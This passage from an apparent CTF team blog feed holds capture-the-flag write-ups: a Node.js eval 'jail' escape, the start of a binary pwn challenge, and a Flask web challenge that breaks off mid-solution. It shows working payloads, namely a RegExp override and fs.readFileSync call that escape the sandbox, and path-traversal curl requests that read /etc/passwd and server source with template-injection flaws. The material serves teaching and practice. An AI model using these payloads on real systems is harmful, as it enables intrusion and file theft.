<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">number</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> hangup = process.exit;</div><div class="line">        <span class="keyword">var</span> line = <span class="string">""</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(number == <span class="number">911</span>)&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"Invalid number"</span>);</div><div class="line">            ask();</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">var</span> flag,<span class="built_in">Array</span>,<span class="built_in">Boolean</span>,<span class="built_in">Date</span>,global,<span class="built_in">Error</span>,<span class="built_in">EvalError</span>,<span class="built_in">Function</span>,<span class="built_in">Number</span>,<span class="built_in">Object</span>,<span class="built_in">RangeError</span>,<span class="built_in">ReferenceError</span>,<span class="built_in">String</span>,<span class="built_in">SyntaxError</span>,<span class="built_in">TypeError</span>,<span class="built_in">URIError</span>,<span class="built_in">decodeURI</span>,<span class="built_in">decodeURIComponent</span>,<span class="built_in">encodeURI</span>,<span class="built_in">encodeURIComponent</span>,<span class="built_in">isFinite</span>,<span class="built_in">isNaN</span>,<span class="built_in">parseFloat</span>,<span class="built_in">parseInt</span>,<span class="built_in">ArrayBuffer</span>,Buffer,DTRACE_HTTP_CLIENT_REQUEST,DTRACE_HTTP_CLIENT_RESPONSE,DTRACE_HTTP_SERVER_REQUEST,DTRACE_HTTP_SERVER_RESPONSE,DTRACE_NET_SERVER_CONNECTION,DTRACE_NET_STREAM_END,<span class="built_in">DataView</span>,<span class="built_in">Float32Array</span>,<span class="built_in">Float64Array</span>,<span class="built_in">Int16Array</span>,<span class="built_in">Int32Array</span>,<span class="built_in">Int8Array</span>,<span class="built_in">Map</span>,<span class="built_in">Promise</span>,<span class="built_in">Proxy</span>,<span class="built_in">Set</span>,<span class="built_in">Symbol</span>,<span class="built_in">Uint16Array</span>,<span class="built_in">Uint32Array</span>,<span class="built_in">Uint8Array</span>,<span class="built_in">Uint8ClampedArray</span>,<span class="built_in">WeakMap</span>,<span class="built_in">WeakSet</span>,assert,clearImmediate,clearInterval,clearTimeout,<span class="built_in">escape</span>,events,<span class="built_in">require</span>,setImmediate,setInterval,setTimeout,stream,<span class="built_in">unescape</span>,__defineGetter__,__defineSetter__,__lookupGetter__,__lookupSetter__,<span class="keyword">constructor</span>,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf;</div><div class="line"></div><div class="line">        if(new RegExp(/[\[\]\.\\]/).test(number))&#123;</div><div class="line">            <span class="built_in">console</span>.log(<span class="string">"Dangerous characters detected"</span>);</div><div class="line">            hangup();</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">arguments</span> = <span class="literal">undefined</span>;</div><div class="line"></div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"Calling "</span>+<span class="built_in">eval</span>(number)+<span class="string">"... Nobody picks up!"</span>);</div><div class="line">        hangup();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>We can see after we send our <code>number</code> the program will end, at the begin of the function we can see the hangup function is being set into <code>process.exit</code>. We have an interesting feature too if we try to call 911 we will jump into <code>ask</code> function:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; ask</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">ask</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    rl.question(template,<span class="function"><span class="keyword">function</span>(<span class="params">answer</span>)</span>&#123;</div><div class="line">        Jail.call(answer);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>As we can see the function ask is restarting the program this will come handy later, we have some restriction too RegexExp class is blocking ‘.’, ‘[‘, ‘]’ and ‘\‘ characters:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="regexp">/[\[\]\.\\]/</span>).test(number))&#123;</div><div class="line">   <span class="built_in">console</span>.log(<span class="string">"Dangerous characters detected"</span>);</div><div class="line">   hangup();</div><div class="line">   <span class="keyword">return</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>So how do can we bypass this? my plan was:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 - Override RegexExp class to always return true.</div><div class="line">2 - Recall function call but this time with 911 number(this will restart the program and a this point RegexExp returns always false so we can inject any character we want).</div><div class="line">3 - Get the current filename.</div><div class="line">4 - Use process.mainModule.require(&apos;fs&apos;).readFileSync(filename) to read the file and get the flag!</div></pre></td></tr></table></figure>
<h3 id="Override-RegexExp"><a href="#Override-RegexExp" class="headerlink" title="Override RegexExp"></a>Override RegexExp</h3><p>To override the RegexExp class we can just do this:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hangup = <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123; <span class="built_in">RegExp</span> = <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123; test() &#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;&#125;; call(<span class="number">911</span>);&#125;</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</span></div><div class="line"><span class="string">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</span></div><div class="line"><span class="string">Invalid number</span></div><div class="line"><span class="string">_____________________________</span></div><div class="line"><span class="string">     ||   ||     ||   ||</span></div><div class="line"><span class="string">     ||   ||, , ,||   ||</span></div><div class="line"><span class="string">     ||  (||/|/(/||/  ||</span></div><div class="line"><span class="string">     ||  ||| _'</span>_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"|</span></div><div class="line"><span class="string">| "</span>You get one call, UNO.<span class="string">"  |</span></div><div class="line"><span class="string"> "</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span></div><div class="line"> Phone <span class="comment">#&gt;</span></div></pre></td></tr></table></figure>
<h3 id="Getting-the-filename"><a href="#Getting-the-filename" class="headerlink" title="Getting the filename"></a>Getting the filename</h3><p>At this point we can inject any characters we want because the test function will always return false! so lets get the filename:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _&apos;_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|</div><div class="line">| &quot;You get one call, UNO.&quot;  |</div><div class="line"> &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</div><div class="line"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</div><div class="line">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</div><div class="line">Invalid number</div><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _&apos;_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|</div><div class="line">| &quot;You get one call, UNO.&quot;  |</div><div class="line"> &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;</div><div class="line"> Phone #&gt; __filename</div><div class="line">Calling /app/jail.js... Nobody picks up!</div></pre></td></tr></table></figure>
<p>We have the full path! the javascript file is located in /app/jail.js </p>
<h3 id="Read-the-javascript-file"><a href="#Read-the-javascript-file" class="headerlink" title="Read the javascript file"></a>Read the javascript file</h3><p>Finally by injecting this after the override <code> process.mainModule.require(‘fs’).readFileSync(‘/app/jail.js’).toString()</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; hangup = function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;</span></div><div class="line"><span class="string">Calling function a() &#123; RegExp = class Dog extends RegExp &#123; test() &#123;return false;&#125;&#125;; call(911);&#125;... Nobody picks up!</span></div><div class="line"><span class="string">Invalid number</span></div><div class="line"><span class="string">_____________________________</span></div><div class="line"><span class="string">     ||   ||     ||   ||</span></div><div class="line"><span class="string">     ||   ||, , ,||   ||</span></div><div class="line"><span class="string">     ||  (||/|/(/||/  ||</span></div><div class="line"><span class="string">     ||  ||| _'</span>_´|||  ||</div><div class="line">     ||   || o o ||   ||</div><div class="line">     ||  (||  - ´||)  ||</div><div class="line">     ||   ||  =  ||   ||</div><div class="line">     ||   ||\___/||   ||</div><div class="line">     ||___||) , (||___||</div><div class="line">    /||---||-\_/-||---||\</div><div class="line">   / ||--_||_____||_--|| \ </div><div class="line">  (_(||)-|S555-4202|-(||)_)</div><div class="line">|<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"|</span></div><div class="line"><span class="string">| "</span>You get one call, UNO.<span class="string">"  |</span></div><div class="line"><span class="string"> "</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span></div><div class="line"> Phone <span class="comment">#&gt; process.mainModule.require('fs').readFileSync('/app/jail.js').toString()</span></div><div class="line">Calling var flag = <span class="string">"SECT&#123;1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,&#125;"</span></div><div class="line">var readline = require(<span class="string">'readline'</span>);</div><div class="line">var rl = readline.createInterface(process.stdin, process.stdout);</div></pre></td></tr></table></figure>
<p>Finally our flag is SECT{1ts_1n_th4T_pl4Ce_Wh3re_1_Pu7_tH4t_Th1ng_th4T_t1m3,}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Jail - Pwn (200 + 0)&lt;br&gt;&lt;br&gt;Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="jailescape" scheme="https://teamrocketist.github.io/tags/jailescape/"/>
    
      <category term="sandbox" scheme="https://teamrocketist.github.io/tags/sandbox/"/>
    
      <category term="javascript" scheme="https://teamrocketist.github.io/tags/javascript/"/>
    
      <category term="nodejs" scheme="https://teamrocketist.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] ASIS - Mary Morton</title>
    <link href="https://teamrocketist.github.io/2017/09/13/Pwn-ASIS-Mary-Morton/"/>
    <id>https://teamrocketist.github.io/2017/09/13/Pwn-ASIS-Mary-Morton/</id>
    <published>2017-09-13T11:25:06.000Z</published>
    <updated>2017-09-15T15:45:48.028Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br> Mary Morton<br><br>Average: 4<br>Rating Count: 20<br>Top 3 Solver<br><br>    217<br>    DangRanKeYi<br>    Alone<br><br>Points<br>43<br>Solves<br>142<br>Category<br>Pwnable<br><br>Description:<br><br>    Mary surprises Sherlock with her knowledge and insight into his character, but she had a very obvious vulnerability which Sherlock exploited it, although it was very painful for him!<br></blockquote>

<p>Starting by checking the binary security with checksec:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ checksec -f ./mary_morton</div><div class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE</div><div class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes	0		2	./mary_morton</div></pre></td></tr></table></figure>
<p>We have stack canary protection and non executable stack, if we analyse the binary with radare2 we can see it’s protected with a password, we can obtain this using radare2:</p>
<p><img src="https://i.imgur.com/8qdQZCd.png" alt="password"></p>
<p>The password</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt; Mary Morton&lt;br&gt;&lt;br&gt;Average: 4&lt;br&gt;Rating Count: 20&lt;br&gt;Top 3 Solver&lt;br&gt;&lt;br&gt;    217&lt;br&gt;    DangRanKeYi&lt;br&gt;    Alone&lt;br&gt;&lt;br&gt;Poi
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="stackcanary" scheme="https://teamrocketist.github.io/tags/stackcanary/"/>
    
      <category term="stackoverflow" scheme="https://teamrocketist.github.io/tags/stackoverflow/"/>
    
      <category term="formatstring" scheme="https://teamrocketist.github.io/tags/formatstring/"/>
    
  </entry>
  
  <entry>
    <title>[Web] ASIS - Golem is stupid!</title>
    <link href="https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/"/>
    <id>https://teamrocketist.github.io/2017/09/11/Web-ASIS-Golem-is-stupid/</id>
    <published>2017-09-11T04:08:19.000Z</published>
    <updated>2017-09-17T22:37:51.368Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Average: 4.57<br>Rating Count: 28<br>You Rated: Not rated<br><br>Top 3 Solver<br><br>    NYUSEC<br>    0daysober<br>    TokyoWesterns<br><br>Points<br>41<br>Solves<br>151<br>Category<br>Web<br><br>Description:<br><br>    Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid!<br></blockquote>

<p>Note that the server was down after the CTF ended I can’t show some pictures of the CTF as I would like.<br>We could easily find a LFI on <code><a href="https://golem.asisctf.com/article?name=" target="_blank" rel="external">https://golem.asisctf.com/article?name=</a></code> : </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'https://golem.asisctf.com/article?name=../../../etc/passwd'</span></div></pre></td></tr></table></figure>
<p>We could include the /etc/passwd file, we noticed the website was running on Ngnix so we tried some valid paths paths for the configuration files like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'https://golem.asisctf.com/article?name=../../../etc/nginx/sites-available/golem'</span></div></pre></td></tr></table></figure>
<p>And we got this<br><img src="https://i.imgur.com/gEq4ILo.png" alt="Ngnix"></p>
<p>The important part of this config file is here! the path to the python configuration server files:</p>
<p><img src="https://i.imgur.com/RFam1DR.png" alt="server path"></p>
<p>After some trial and error we included the server.py with:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/server.py'</span></div></pre></td></tr></table></figure>
<p>The file is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"> </div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</div><div class="line">    Flask,</div><div class="line">    render_template,</div><div class="line">    request,</div><div class="line">    url_for,</div><div class="line">    redirect,</div><div class="line">    session,</div><div class="line">    render_template_string</div><div class="line">)</div><div class="line"><span class="keyword">from</span> flask.ext.session <span class="keyword">import</span> Session</div><div class="line"> </div><div class="line">app = Flask(__name__)</div><div class="line"> </div><div class="line"> </div><div class="line">execfile(<span class="string">'flag.py'</span>)</div><div class="line">execfile(<span class="string">'key.py'</span>)</div><div class="line"> </div><div class="line">FLAG = flag</div><div class="line">app.secret_key = key</div><div class="line"> </div><div class="line"><span class="meta">@app.route("/golem", methods=["GET", "POST"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">golem</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> request.method != <span class="string">"POST"</span>:</div><div class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"index"</span>))</div><div class="line"> </div><div class="line">    golem = request.form.get(<span class="string">"golem"</span>) <span class="keyword">or</span> <span class="keyword">None</span></div><div class="line"> </div><div class="line">    <span class="keyword">if</span> golem <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        golem = golem.replace(<span class="string">"."</span>, <span class="string">""</span>).replace(<span class="string">"_"</span>, <span class="string">""</span>).replace(<span class="string">"&#123;"</span>,<span class="string">""</span>).replace(<span class="string">"&#125;"</span>,<span class="string">""</span>)</div><div class="line">   </div><div class="line">    <span class="keyword">if</span> <span class="string">"golem"</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">'golem'</span>] <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        session[<span class="string">'golem'</span>] = golem</div><div class="line"> </div><div class="line">    template = <span class="keyword">None</span></div><div class="line"> </div><div class="line">    <span class="keyword">if</span> session[<span class="string">'golem'</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">        template = <span class="string">'''&#123;%% extends "layout.html" %%&#125;</span></div><div class="line"><span class="string">        &#123;%% block body %%&#125;</span></div><div class="line"><span class="string">        &lt;h1&gt;Golem Name&lt;/h1&gt;</span></div><div class="line"><span class="string">        &lt;div class="row&gt;</span></div><div class="line"><span class="string">        &lt;div class="col-md-6 col-md-offset-3 center"&gt;</span></div><div class="line"><span class="string">        Hello : %s, why you don't look at our &lt;a href='/article?name=article'&gt;article&lt;/a&gt;?</span></div><div class="line"><span class="string">        &lt;/div&gt;</span></div><div class="line"><span class="string">        &lt;/div&gt;</span></div><div class="line"><span class="string">        &#123;%% endblock %%&#125;</span></div><div class="line"><span class="string">        '''</span> % session[<span class="string">'golem'</span>]</div><div class="line"> </div><div class="line">        <span class="keyword">print</span></div><div class="line"> </div><div class="line">        session[<span class="string">'golem'</span>] = <span class="keyword">None</span></div><div class="line"> </div><div class="line">    <span class="keyword">return</span> render_template_string(template)</div><div class="line"> </div><div class="line"><span class="meta">@app.route("/", methods=["GET"])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">"main.html"</span>)</div><div class="line"> </div><div class="line"><span class="meta">@app.route('/article', methods=['GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span><span class="params">()</span>:</span></div><div class="line"> </div><div class="line">    error = <span class="number">0</span></div><div class="line"> </div><div class="line">    <span class="keyword">if</span> <span class="string">'name'</span> <span class="keyword">in</span> request.args:</div><div class="line">        page = request.args.get(<span class="string">'name'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        page = <span class="string">'article'</span></div><div class="line"> </div><div class="line">    <span class="keyword">if</span> page.find(<span class="string">'flag'</span>)&gt;=<span class="number">0</span>:</div><div class="line">        page = <span class="string">'notallowed.txt'</span></div><div class="line"> </div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        template = open(<span class="string">'/home/golem/articles/&#123;&#125;'</span>.format(page)).read()</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        template = e</div><div class="line"> </div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">'article.html'</span>, template=template)</div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="keyword">False</span>)</div></pre></td></tr></table></figure>
<p>Now the real problem is the flag is in flag.py file but the word flag is filtered:</p>
